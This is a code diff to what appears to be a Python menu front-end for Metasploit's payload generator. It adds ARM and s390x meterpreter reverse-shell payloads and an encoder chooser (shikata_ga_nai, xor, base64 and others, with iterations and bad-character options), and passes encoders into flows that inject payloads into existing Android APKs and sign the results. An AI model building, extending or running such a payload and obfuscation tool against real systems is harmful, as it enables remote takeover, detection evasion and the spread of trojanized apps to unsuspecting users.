@@ -121,6 +121,15 @@ def pick_linux_payload() -> None:
     print('[10] linux/x64/meterpreter/bind_tcp')
     print('[11] linux/x86/shell/bind_tcp')
     print('[12] linux/x64/shell/reverse_tcp')
+    print('[13] linux/zarch/meterpreter_reverse_tcp')
+    print('[14] linux/zarch/meterpreter_reverse_http')
+    print('[15] linux/zarch/meterpreter_reverse_https')
+    print('[16] linux/aarch64/meterpreter_reverse_tcp')
+    print('[17] linux/aarch64/meterpreter_reverse_http')
+    print('[18] linux/aarch64/meterpreter_reverse_https')
+    print('[19] linux/armle/meterpreter_reverse_tcp')
+    print('[20] linux/armle/meterpreter_reverse_http')
+    print('[21] linux/armle/meterpreter_reverse_https')
     p = ask('choose: ').strip()
 
     if p == '1':
@@ -147,6 +156,24 @@ def pick_linux_payload() -> None:
         simple_flow('linux_x86_shell_bind_tcp')
     elif p == '12':
         simple_flow('linux_x64_shell_reverse_tcp')
+    elif p == '13':
+        simple_flow('linux_zarch_meterpreter_reverse_tcp')
+    elif p == '14':
+        simple_flow('linux_zarch_meterpreter_reverse_http')
+    elif p == '15':
+        simple_flow('linux_zarch_meterpreter_reverse_https')
+    elif p == '16':
+        simple_flow('linux_aarch64_meterpreter_reverse_tcp')
+    elif p == '17':
+        simple_flow('linux_aarch64_meterpreter_reverse_http')
+    elif p == '18':
+        simple_flow('linux_aarch64_meterpreter_reverse_https')
+    elif p == '19':
+        simple_flow('linux_armle_meterpreter_reverse_tcp')
+    elif p == '20':
+        simple_flow('linux_armle_meterpreter_reverse_http')
+    elif p == '21':
+        simple_flow('linux_armle_meterpreter_reverse_https')
     else:
         warn('Invalid choice.')
 
@@ -255,6 +282,56 @@ def pick_other_payloads() -> None:
     else:
         warn('Invalid option')
 
+
+def pick_encoder() -> tuple:
+    print('\n[ Encoder Options ]')
+
+    print('[1]  x86/shikata_ga_nai (Recommended)')
+    print('[2]  x64/xor')
+    print('[3]  x86/xor_dynamic')
+    print('[4]  x86/countdown')
+    print('[5]  cmd/powershell_base64')
+    print('[6]  x64/xor_dynamic')
+    print('[7]  x64/xor_context')
+    print('[8]  x86/xor_poly')
+    print('[9]  x86/fnstenv_mov')
+    print('[10] x86/jmp_call_additive')
+    print('[11] x86/call4_dword_xor')
+    print('[12] cmd/base64')
+    print('[13] generic/none')
+
+    choice = ask('Choose encoder: ').strip()
+
+    enc_map = {
+        '1': 'x86/shikata_ga_nai',
+        '2': 'x64/xor',
+        '3': 'x86/xor_dynamic',
+        '4': 'x86/countdown',
+        '5': 'cmd/powershell_base64',
+        '6': 'x64/xor_dynamic',
+        '7': 'x64/xor_context',
+        '8': 'x86/xor_poly',
+        '9': 'x86/fnstenv_mov',
+        '10': 'x86/jmp_call_additive',
+        '11': 'x86/call4_dword_xor',
+        '12': 'cmd/base64',
+        '13': ''
+    }
+
+    encoder = enc_map.get(choice, '')
+
+    itr = ask('Iterations (default 1): ').strip()
+    if itr == '':
+        itr = 1
+    else:
+        if not itr.isdigit():
+            warn('Invalid iteration, using 1')
+            itr = 1
+        else:
+            itr = int(itr)
+
+    return encoder, itr
+
 def android_normal() -> None:
     clear()
     show()
@@ -269,7 +346,8 @@ def android_normal() -> None:
         return
     out = ask('Output apk (example: /path/to/payloadname.apk): ').strip()
     dry = ask('Dry run? (y/N): ').strip().lower() == 'y'
-    ok = generate(key, lhost, int(lport), out, dry=dry)
+    encoder, itr = '', 1
+    ok = generate(key, lhost, int(lport), out, encoder=encoder, iterations=itr, dry=dry)
     if ok and not dry:
         if ask('Sign & zipalign? (y/N): ').strip().lower() == 'y':
             final = ask('Final name (/path/to/final.apk): ').strip()
@@ -291,7 +369,8 @@ def android_inject() -> None:
     org = ask('Path to original APK: ').strip()
     out = ask('Output apk (example: /path/to/infected.apk): ').strip()
     dry = ask('Dry run? (y/N): ').strip().lower() == 'y'
-    ok = generate(key, lhost, int(lport), out, infile=org, dry=dry)
+    encoder, itr = '', 1
+    ok = generate(key, lhost, int(lport), out, infile=org, encoder=encoder, iterations=itr, dry=dry)
     if ok and not dry:
         if ask('Sign & zipalign? (y/N): ').strip().lower() == 'y':
             final = ask('Final name (/path/to/final.apk): ').strip()
@@ -333,4 +412,16 @@ def simple_flow(kind: str) -> None:
             "Enter output file: "
           ).strip()
     dry = ask('Dry run? (y/N): ').strip().lower() == 'y'
-    generate(kind, lhost, int(lport), out, dry=dry)
+    is_script = any(kind.startswith(x) for x in ['python', 'ruby', 'nodejs', 'bash', 'perl', 'unix'])
+    is_web = any(kind.startswith(x) for x in ['php', 'jsp', 'java'])
+    is_mobile = kind.startswith('android') or kind.startswith('ios')
+    is_linux_arm = any(kind.startswith(x) for x in ['linux_armle', 'linux_aarch64', 'linux_zarch'])
+
+    if is_script or is_web or is_mobile or is_linux_arm:
+        info('[!] Encoder & badchars disabled for this payload type')
+        encoder, itr = '', 1
+        badchars = None
+    else:
+       encoder, itr = pick_encoder()
+       badchars = ask('Bad characters (example: \\x00\\x0a) [Enter to skip]: ').strip() or None
+    generate(kind, lhost, int(lport), out, encoder=encoder, iterations=itr, badchars=badchars, dry=dry)
